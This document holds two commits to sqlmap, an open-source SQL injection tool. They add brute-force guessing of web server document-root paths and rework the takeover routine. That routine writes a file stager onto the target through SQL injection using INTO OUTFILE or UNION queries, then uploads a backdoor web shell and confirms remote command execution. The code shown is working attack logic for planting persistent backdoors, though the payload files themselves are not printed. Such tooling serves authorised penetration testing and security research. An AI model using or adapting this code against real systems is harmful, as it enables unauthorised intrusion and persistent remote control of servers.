sqlmapproject/sqlmap

commit fc57b7565d9dd3b63468063ba5b6ddbd36f0dbcd

Implementation for an Issue #432

lib/core/common.py
@@ -82,6 +82,9 @@ from lib.core.exception import SqlmapUserQuitException
 from lib.core.log import LOGGER_HANDLER
 from lib.core.optiondict import optDict
 from lib.core.settings import BOLD_PATTERNS
+from lib.core.settings import BRUTE_DOC_ROOT_PREFIXES
+from lib.core.settings import BRUTE_DOC_ROOT_SUFFIXES
+from lib.core.settings import BRUTE_DOC_ROOT_TARGET_MARK
 from lib.core.settings import CUSTOM_INJECTION_MARK_CHAR
 from lib.core.settings import DBMS_DIRECTORY_DICT
 from lib.core.settings import DEFAULT_COOKIE_DELIMITER
@@ -99,6 +102,7 @@ from lib.core.settings import HASHDB_MILESTONE_VALUE
 from lib.core.settings import HOST_ALIASES
 from lib.core.settings import INFERENCE_UNKNOWN_CHAR
 from lib.core.settings import INVALID_UNICODE_CHAR_FORMAT
+from lib.core.settings import IP_ADDRESS_REGEX
 from lib.core.settings import ISSUES_PAGE
 from lib.core.settings import IS_WIN
 from lib.core.settings import LARGE_OUTPUT_THRESHOLD
@@ -644,38 +648,48 @@ def getDocRoot():
 
         docRoot = []
 
-        message = "do you want to provide a text file with a list of "
-        message += "directories to try? [y/N] "
-        answer = readInput(message, default="N")
+        message = "what do you want to use for web server document root?\n"
+        message += "[1] common location(s) '%s' (default)\n" % ", ".join(root for root in defaultDocRoot)
+        message += "[2] custom location\n"
+        message += "[3] custom directory list file\n"
+        message += "[4] brute force search\n"
+        choice = readInput(message, default="1").strip()
 
-        if answer and answer.lower() == "y":
-            message = "please provide the directories list file to try: "
-            dirFilePath = readInput(message)
+        if choice == "2":
+            message = "please provide the web server document root: "
+            docRoot = readInput(message).split(',')
+        elif choice == "3":
+            message = "what's the list file location?\n"
+            listPath = readInput(message)
+            checkFile(listPath)
+            docRoot = getFileItems(listPath)
+        elif choice == "4":
+            targets = set([conf.hostname])
+            _ = conf.hostname.split('.')
 
-            if dirFilePath:
-                if os.path.isfile(dirFilePath):
-                    fd = codecs.open(dirFilePath, "rb", UNICODE_ENCODING)
-
-                    for filepath in fd.readlines():
-                        docRoot.append(normalizePath(filepath))
-
-                else:
-                    errMsg = "provided directory list file %s " % dirFilePath
-                    errMsg += "is not a valid file"
-                    logger.error(errMsg)
-
-        if len(docRoot) == 0:
-            message = "please provide the web server document root "
-            message += "[%s]: " % ", ".join(root for root in defaultDocRoot)
-            inputDocRoot = readInput(message, default=defaultDocRoot)
-
-            if inputDocRoot:
-                if isinstance(inputDocRoot, basestring):
-                    docRoot = inputDocRoot.split(',')
-                else:
-                    docRoot = inputDocRoot
+            if _[0] == "www":
+                targets.add('.'.join(_[1:]))
+                targets.add('.'.join(_[1:-1]))
             else:
-                docRoot = defaultDocRoot
+                targets.add('.'.join(_[:-1]))
+
+            targets = filter(None, targets)
+
+            for prefix in BRUTE_DOC_ROOT_PREFIXES.get(Backend.getOs(), DEFAULT_DOC_ROOTS[OS.LINUX]):
+                if BRUTE_DOC_ROOT_TARGET_MARK in prefix and re.match(IP_ADDRESS_REGEX, conf.hostname):
+                    continue
+
+                for suffix in BRUTE_DOC_ROOT_SUFFIXES:
+                    for target in targets:
+                        item = "%s/%s" % (prefix, suffix)
+                        item = item.replace(BRUTE_DOC_ROOT_TARGET_MARK, target).replace("//", "/")
+                        docRoot.append(item)
+
+                        if BRUTE_DOC_ROOT_TARGET_MARK not in prefix:
+                            break
+
+        else:
+            docRoot = defaultDocRoot
 
     return docRoot
 
@@ -699,19 +713,6 @@ def getDirs():
     webDir = extractRegexResult(r"//[^/]+?/(?P<result>.*)/.", conf.url)
     if webDir:
         directories.add(webDir)
-
-    message = "please provide additional comma separated file paths to "
-    message += "try to upload the agent inside the possible document: "
-    message += "root%s [Enter for None]: " % "s" if len(kb.docRoot) > 1 else ""
-    inputDirs = readInput(message)
-
-    if inputDirs:
-        inputDirs = inputDirs.replace(", ", ",")
-        inputDirs = inputDirs.split(",")
-
-        for inputDir in inputDirs:
-            if inputDir:
-                directories.add(inputDir)
 
     return list(directories)
 

lib/core/settings.py
@@ -13,6 +13,7 @@ import sys
 
 from lib.core.enums import DBMS
 from lib.core.enums import DBMS_DIRECTORY_NAME
+from lib.core.enums import OS
 from lib.core.revision import getRevisionNumber
 
 # sqlmap version and site
@@ -57,6 +58,9 @@ GOOGLE_REGEX = r"url\?\w+=((?![^>]+webcache\.googleusercontent\.com)http[^>]+)&(
 
 # Regular expression used for extracting content from "textual" tags
 TEXT_TAG_REGEX = r"(?si)<(abbr|acronym|b|blockquote|br|center|cite|code|dt|em|font|h\d|i|li|p|pre|q|strong|sub|sup|td|th|title|tt|u)(?!\w).*?>(?P<result>[^<]+)"
+
+# Regular expression used for recognition of IP addresses
+IP_ADDRESS_REGEX = r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"
 
 # Dumping characters used in GROUP_CONCAT MySQL technique
 CONCAT_ROW_DELIMITER = ','
@@ -546,6 +550,18 @@ METASPLOIT_SESSION_TIMEOUT = 180
 
 # Reference: http://www.cookiecentral.com/faq/#3.5
 NETSCAPE_FORMAT_HEADER_COOKIES = "# Netscape HTTP Cookie File."
+
+# Prefixes used in brute force search for web server document root
+BRUTE_DOC_ROOT_PREFIXES = {
+    OS.LINUX: ("/var/www", "/var/www/%TARGET%", "/var/www/vhosts/%TARGET%", "/var/www/virtual/%TARGET%", "/var/www/clients/vhosts/%TARGET%", "/var/www/clients/virtual/%TARGET%"),
+    OS.WINDOWS: ("/xampp", "/Program Files/xampp/", "/wamp", "/Program Files/wampp/", "/Inetpub/wwwroot", "/Inetpub/wwwroot/%TARGET%", "/Inetpub/vhosts/%TARGET%")
+}
+
+# Suffixes used in brute force search for web server document root
+BRUTE_DOC_ROOT_SUFFIXES = ("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "sites/all", "www/build")
+
+# String used for marking target name inside used brute force web server document root
+BRUTE_DOC_ROOT_TARGET_MARK = "%TARGET%"
 
 # CSS style used in HTML dump format
 HTML_DUMP_CSS_STYLE = """<style>

commit dfa9076a70d06030c4caab08aada3cd0d9fb3f99

fixed and improved web shell upload in MySQL (it was actually broken since fc57b7565d9dd3b63468063ba5b6ddbd36f0dbcd)

lib/core/common.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2014 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -610,15 +610,15 @@ def paramToDict(place, parameters=None):
 
     return testableParameters
 
-def getDocRoot():
-    docRoot = None
+def getManualDirectories():
+    directories = None
     pagePath = directoryPath(conf.path)
 
     defaultDocRoot = DEFAULT_DOC_ROOTS.get(Backend.getOs(), DEFAULT_DOC_ROOTS[OS.LINUX])
 
     if kb.absFilePaths:
         for absFilePath in kb.absFilePaths:
-            if docRoot:
+            if directories:
                 break
 
             if directoryPath(absFilePath) == '/':
@@ -636,41 +636,41 @@ def getDocRoot():
                     _ = "/%s/" % _
 
                     if _ in absFilePath:
-                        docRoot = "%s%s" % (absFilePath.split(_)[0], _)
+                        directories = "%s%s" % (absFilePath.split(_)[0], _)
                         break
 
             if pagePath and pagePath in absFilePath:
-                docRoot = absFilePath.split(pagePath)[0]
+                directories = absFilePath.split(pagePath)[0]
                 if windowsDriveLetter:
-                    docRoot = "%s/%s" % (windowsDriveLetter, ntToPosixSlashes(docRoot))
+                    directories = "%s/%s" % (windowsDriveLetter, ntToPosixSlashes(directories))
 
-    docRoot = normalizePath(docRoot)
+    directories = normalizePath(directories)
 
-    if docRoot:
-        infoMsg = "retrieved the web server document root: '%s'" % docRoot
+    if directories:
+        infoMsg = "retrieved the web server document root: '%s'" % directories
         logger.info(infoMsg)
     else:
         warnMsg = "unable to retrieve automatically the web server "
         warnMsg += "document root"
         logger.warn(warnMsg)
 
-        docRoot = []
+        directories = []
 
-        message = "what do you want to use for web server document root?\n"
+        message = "what do you want to use for writable directory?\n"
         message += "[1] common location(s) '%s' (default)\n" % ", ".join(root for root in defaultDocRoot)
-        message += "[2] custom location\n"
+        message += "[2] custom location(s)\n"
         message += "[3] custom directory list file\n"
         message += "[4] brute force search\n"
         choice = readInput(message, default="1").strip()
 
         if choice == "2":
-            message = "please provide the web server document root: "
-            docRoot = readInput(message, default="").split(',')
+            message = "please provide a comma separate list of absolute directory paths: "
+            directories = readInput(message, default="").split(',')
         elif choice == "3":
             message = "what's the list file location?\n"
             listPath = readInput(message, default="")
             checkFile(listPath)
-            docRoot = getFileItems(listPath)
+            directories = getFileItems(listPath)
         elif choice == "4":
             targets = set([conf.hostname])
             _ = conf.hostname.split('.')
@@ -691,31 +691,30 @@ def getDocRoot():
                     for target in targets:
                         item = "%s/%s" % (prefix, suffix)
                         item = item.replace(BRUTE_DOC_ROOT_TARGET_MARK, target).replace("//", '/').rstrip('/')
-                        docRoot.append(item)
+                        directories.append(item)
 
                         if BRUTE_DOC_ROOT_TARGET_MARK not in prefix:
                             break
 
-            infoMsg = "using common document root locations: %s" % ','.join(docRoot)
+            infoMsg = "using common directories: %s" % ','.join(directories)
             logger.info(infoMsg)
 
-            msg = "use additional custom "
-            msg += "document root locations [Enter for None]: "
+            msg = "use additional custom directories [Enter for None]: "
             answer = readInput(msg)
 
             if answer:
-                docRoot.extend(answer.split(','))
+                directories.extend(answer.split(','))
 
         else:
-            docRoot = defaultDocRoot
+            directories = defaultDocRoot
 
-    return docRoot
+    return directories
 
-def getDirs():
+def getAutoDirectories():
     directories = set("/")
 
     if kb.absFilePaths:
-        infoMsg = "retrieved web server full paths: "
+        infoMsg = "retrieved web server absolute paths: "
         infoMsg += "'%s'" % ", ".join(ntToPosixSlashes(path) for path in kb.absFilePaths)
         logger.info(infoMsg)
 
@@ -728,7 +727,8 @@ def getDirs():
         warnMsg = "unable to retrieve automatically any web server path"
         logger.warn(warnMsg)
 
-    webDir = extractRegexResult(r"//[^/]+?/(?P<result>.*)/", conf.url)
+    webDir = extractRegexResult(r"//[^/]+?(?P<result>/.*)/", conf.url)
+
     if webDir:
         directories.add(webDir)
 

lib/takeover/web.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2014 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -17,8 +17,8 @@ from lib.core.agent import agent
 from lib.core.common import arrayizeValue
 from lib.core.common import Backend
 from lib.core.common import extractRegexResult
-from lib.core.common import getDirs
-from lib.core.common import getDocRoot
+from lib.core.common import getAutoDirectories
+from lib.core.common import getManualDirectories
 from lib.core.common import getPublicTypeMembers
 from lib.core.common import getSQLSnippet
 from lib.core.common import getUnicode
@@ -194,8 +194,9 @@ class Web:
                 self.webApi = choices[int(choice) - 1]
                 break
 
-        kb.docRoot = arrayizeValue(getDocRoot())
-        directories = sorted(getDirs())
+        directories = list(arrayizeValue(getManualDirectories()))
+        directories.extend(getAutoDirectories())
+        directories = sorted(set(directories))
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
         backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))
@@ -204,155 +205,162 @@ class Web:
         stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
         success = False
 
-        for docRoot in kb.docRoot:
+        for directory in directories:
             if success:
                 break
 
-            for directory in directories:
-                uriPath = ""
+            uploaded = False
+            directory = ntToPosixSlashes(normalizePath(directory))
 
-                if not all(isinstance(_, basestring) for _ in (docRoot, directory)):
-                    continue
+            if not isWindowsDriveLetterPath(directory) and directory[0] != '/':
+                directory = "/%s" % directory
+            else:
+                directory = directory[2:] if isWindowsDriveLetterPath(directory) else directory
 
-                directory = ntToPosixSlashes(normalizePath(directory)).replace("//", "/").rstrip('/')
-                docRoot = ntToPosixSlashes(normalizePath(docRoot)).replace("//", "/").rstrip('/')
+            directory = posixpath.normpath(directory)
 
-                # '' or '/' -> 'docRoot'
-                if not directory:
-                    localPath = docRoot
-                    uriPath = '/'
-                # 'dir1/dir2/dir3' -> 'docRoot/dir1/dir2/dir3'
-                elif not isWindowsDriveLetterPath(directory) and directory[0] != '/':
-                    localPath = "%s/%s" % (docRoot, directory)
-                    uriPath = "/%s" % directory
-                else:
-                    localPath = directory
-                    uriPath = directory[2:] if isWindowsDriveLetterPath(directory) else directory
+            # Upload the file stager with the LIMIT 0, 1 INTO OUTFILE technique
+            infoMsg = "trying to upload the file stager on '%s' " % directory
+            infoMsg += "via LIMIT INTO OUTFILE technique"
+            logger.info(infoMsg)
+            self._webFileInject(stagerContent, stagerName, directory)
 
-                    if docRoot in uriPath:
-                        uriPath = uriPath.replace(docRoot, "/")
-                        uriPath = "/%s" % normalizePath(uriPath)
-                    else:
-                        webDir = extractRegexResult(r"//[^/]+?/(?P<result>.*)/.", conf.url)
+            for x in list(re.finditer('/', directory)):
+                self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, directory[x.start():])
+                self.webStagerUrl = os.path.join(self.webBaseUrl, stagerName)
+                self.webStagerFilePath = posixpath.normpath(ntToPosixSlashes(os.path.join(directory, stagerName)))
 
-                        if webDir:
-                            uriPath = "/%s" % webDir
-                        else:
-                            continue
-
-                localPath = posixpath.normpath(localPath).rstrip('/')
-                uriPath = posixpath.normpath(uriPath).rstrip('/')
-
-                # Upload the file stager with the LIMIT 0, 1 INTO OUTFILE technique
-                infoMsg = "trying to upload the file stager on '%s' " % localPath
-                infoMsg += "via LIMIT INTO OUTFILE technique"
-                logger.info(infoMsg)
-                self._webFileInject(stagerContent, stagerName, localPath)
-
-                self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, uriPath)
-                self.webStagerUrl = "%s/%s" % (self.webBaseUrl, stagerName)
-                self.webStagerFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (localPath, stagerName))).replace("//", "/").rstrip('/')
+                debugMsg = "trying to see if the file is accessible from %s" % self.webStagerUrl
+                logger.debug(debugMsg)
 
                 uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                 uplPage = uplPage or ""
 
-                # Fall-back to UNION queries file upload technique
-                if "sqlmap file uploader" not in uplPage:
-                    warnMsg = "unable to upload the file stager "
-                    warnMsg += "on '%s'" % localPath
-                    singleTimeWarnMessage(warnMsg)
+                if "sqlmap file uploader" in uplPage:
+                    uploaded = True
 
-                    if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
-                        infoMsg = "trying to upload the file stager on '%s' " % localPath
-                        infoMsg += "via UNION technique"
-                        logger.info(infoMsg)
+            # Fall-back to UNION queries file upload technique
+            if not uploaded:
+                warnMsg = "unable to upload the file stager "
+                warnMsg += "on '%s'" % directory
+                singleTimeWarnMessage(warnMsg)
 
-                        handle, filename = mkstemp()
-                        os.fdopen(handle).close()  # close low level handle (causing problems later)
+                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
+                    infoMsg = "trying to upload the file stager on '%s' " % directory
+                    infoMsg += "via UNION technique"
+                    logger.info(infoMsg)
 
-                        with open(filename, "w+") as f:
-                            _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
-                            _ = _.replace("WRITABLE_DIR", localPath.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else localPath)
-                            f.write(utf8encode(_))
+                    handle, filename = mkstemp()
+                    os.fdopen(handle).close()  # close low level handle (causing problems later)
 
-                        self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
+                    with open(filename, "w+") as f:
+                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
+                        _ = _.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
+                        f.write(utf8encode(_))
+
+                    self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
+
+                    uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
+                    uplPage = uplPage or ""
+
+                    for x in list(re.finditer('/', directory)):
+                        self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, directory[x.start():])
+                        self.webStagerUrl = os.path.join(self.webBaseUrl, stagerName)
+                        self.webStagerFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (directory, stagerName))).replace("//", "/").rstrip('/')
+
+                        debugMsg = "trying to see if the file is accessible from %s" % self.webStagerUrl
+                        logger.debug(debugMsg)
 
                         uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                         uplPage = uplPage or ""
 
-                        if "sqlmap file uploader" not in uplPage:
-                            continue
-                    else:
-                        continue
-
-                if "<%" in uplPage or "<?" in uplPage:
-                    warnMsg = "file stager uploaded on '%s', " % localPath
-                    warnMsg += "but not dynamically interpreted"
-                    logger.warn(warnMsg)
+                        if "sqlmap file uploader" in uplPage:
+                            uploaded = True
+                else:
                     continue
 
-                elif self.webApi == WEB_API.ASPX:
-                    kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
-                    kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)
+            if not uploaded:
+                self.webBaseUrl = "%s://%s:%d/" % (conf.scheme, conf.hostname, conf.port)
+                self.webStagerUrl = os.path.join(self.webBaseUrl, stagerName)
+                self.webStagerFilePath = posixpath.normpath(ntToPosixSlashes(os.path.join(directory, stagerName)))
 
-                infoMsg = "the file stager has been successfully uploaded "
-                infoMsg += "on '%s' - %s" % (localPath, self.webStagerUrl)
-                logger.info(infoMsg)
+                debugMsg = "trying to see if the file is accessible from %s" % self.webStagerUrl
+                logger.debug(debugMsg)
 
-                if self.webApi == WEB_API.ASP:
-                    match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)
+                uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
+                uplPage = uplPage or ""
 
-                    if match:
-                        backdoorDirectory = match.group(1)
+                if "sqlmap file uploader" not in uplPage:
+                    continue
+
+            if "<%" in uplPage or "<?" in uplPage:
+                warnMsg = "file stager uploaded on '%s', " % directory
+                warnMsg += "but not dynamically interpreted"
+                logger.warn(warnMsg)
+                continue
+
+            elif self.webApi == WEB_API.ASPX:
+                kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
+                kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)
+
+            infoMsg = "the file stager has been successfully uploaded "
+            infoMsg += "on '%s' - %s" % (directory, self.webStagerUrl)
+            logger.info(infoMsg)
+
+            if self.webApi == WEB_API.ASP:
+                match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)
+
+                if match:
+                    backdoorDirectory = match.group(1)
+                else:
+                    continue
+
+                _ = "tmpe%s.exe" % randomStr(lowercase=True)
+                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", _)):
+                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'))
+                    self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
+                    self.webDirectory = backdoorDirectory
+                else:
+                    continue
+
+            else:
+                if not self.webUpload(backdoorName, posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory, content=backdoorContent):
+                    warnMsg = "backdoor has not been successfully uploaded "
+                    warnMsg += "through the file stager possibly because "
+                    warnMsg += "the user running the web server process "
+                    warnMsg += "has not write privileges over the folder "
+                    warnMsg += "where the user running the DBMS process "
+                    warnMsg += "was able to upload the file stager or "
+                    warnMsg += "because the DBMS and web server sit on "
+                    warnMsg += "different servers"
+                    logger.warn(warnMsg)
+
+                    message = "do you want to try the same method used "
+                    message += "for the file stager? [Y/n] "
+                    getOutput = readInput(message, default="Y")
+
+                    if getOutput in ("y", "Y"):
+                        self._webFileInject(backdoorContent, backdoorName, directory)
                     else:
                         continue
 
-                    _ = "tmpe%s.exe" % randomStr(lowercase=True)
-                    if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", _)):
-                        self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'))
-                        self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
-                        self.webDirectory = backdoorDirectory
-                    else:
-                        continue
+                self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
+                self.webDirectory = directory
 
-                else:
-                    if not self.webUpload(backdoorName, posixToNtSlashes(localPath) if Backend.isOs(OS.WINDOWS) else localPath, content=backdoorContent):
-                        warnMsg = "backdoor has not been successfully uploaded "
-                        warnMsg += "through the file stager possibly because "
-                        warnMsg += "the user running the web server process "
-                        warnMsg += "has not write privileges over the folder "
-                        warnMsg += "where the user running the DBMS process "
-                        warnMsg += "was able to upload the file stager or "
-                        warnMsg += "because the DBMS and web server sit on "
-                        warnMsg += "different servers"
-                        logger.warn(warnMsg)
+            self.webBackdoorFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (directory, backdoorName))).replace("//", "/").rstrip('/')
 
-                        message = "do you want to try the same method used "
-                        message += "for the file stager? [Y/n] "
-                        getOutput = readInput(message, default="Y")
+            testStr = "command execution test"
+            output = self.webBackdoorRunCmd("echo %s" % testStr)
 
-                        if getOutput in ("y", "Y"):
-                            self._webFileInject(backdoorContent, backdoorName, localPath)
-                        else:
-                            continue
+            if output and testStr in output:
+                infoMsg = "the backdoor has been successfully "
+            else:
+                infoMsg = "the backdoor has probably been successfully "
 
-                    self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
-                    self.webDirectory = localPath
+            infoMsg += "uploaded on '%s' - " % self.webDirectory
+            infoMsg += self.webBackdoorUrl
+            logger.info(infoMsg)
 
-                self.webBackdoorFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (localPath, backdoorName))).replace("//", "/").rstrip('/')
+            success = True
 
-                testStr = "command execution test"
-                output = self.webBackdoorRunCmd("echo %s" % testStr)
-
-                if output and testStr in output:
-                    infoMsg = "the backdoor has been successfully "
-                else:
-                    infoMsg = "the backdoor has probably been successfully "
-
-                infoMsg += "uploaded on '%s' - " % self.webDirectory
-                infoMsg += self.webBackdoorUrl
-                logger.info(infoMsg)
-
-                success = True
-
-                break
+            break